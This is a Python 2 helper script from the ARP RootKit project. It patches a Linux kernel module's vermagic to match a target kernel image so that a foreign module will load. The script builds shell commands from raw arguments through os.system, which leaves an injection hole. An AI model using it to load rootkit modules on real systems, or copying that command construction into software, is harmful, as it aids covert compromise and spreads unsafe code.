#!/usr/bin/python
#
# License:
#
# Copyright (c) 2018 Abel Romero Perez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
# Description:
#
# Modifies the vermagic of a Linux Kernel Module, to be the same than
# the one defined in the Linux Kernel Image, of the system where this
# script is ran.
#
# Dependencies:
#
# 1) A Linux Kernel Image
# 2) A Linux Kernel Module
#

import sys
import platform
import re
import os

if len(sys.argv) < 3:
	print sys.argv[0] + ": <kernel> <module> [ref]"
	exit(-1)

vmlinux = "vmlinux-" + platform.release()

# decompress vmlinuz image
os.system("./extract-vmlinux " + sys.argv[1] + " > " + vmlinux)

# load vmlinux binary
f = open(vmlinux, 'rb')
data = f.read()
f.close()

# remove vmlinux binary
os.remove(vmlinux)

if len(sys.argv) >= 4:
	ref = sys.argv[3]
else:
	ref = platform.release()

# search vermagic
pattern = "(" + re.escape(ref) + " .*?" + "\x00{1,7})"
print "Reference is release: " + ref
#print "Searching by regex hex pattern: " + pattern.encode('hex')
regex = re.compile(pattern)

for match_obj in regex.findall(data):
	#print "Match!"
	#print match_obj.encode('hex')
	#print len(match_obj)
	print "Found vermagic: " + match_obj

if len(match_obj) == 0:
	print "Sorry, not found."
	sys.exit(-1)

new_vermagic = match_obj

sectfile = sys.argv[2] + ".modinfo"

# dump .modinfo of LKM
os.system("objcopy --dump-section .modinfo=" + sectfile + " " + sys.argv[2])

# load dumped section file
f = open(sectfile, 'rb')
data = f.read()
f.close()

# remove sectfile
os.remove(sectfile)

# replace vermagic
pattern = "vermagic=(.*?)\x00"
regex = re.compile(pattern)
for match_obj in regex.findall(data):
	print "Replacing \"" + match_obj + "\" by \"" + new_vermagic + "\""

old_vermagic = match_obj

data = data.replace(old_vermagic, new_vermagic)

# save sectfile
f = open(sectfile, 'wb')
f.write(data)
f.close()

# patch LKM
os.system("objcopy --update-section .modinfo=" + sectfile + " " + sys.argv[2])

# remove sectfile
os.remove(sectfile)

print "Done!"
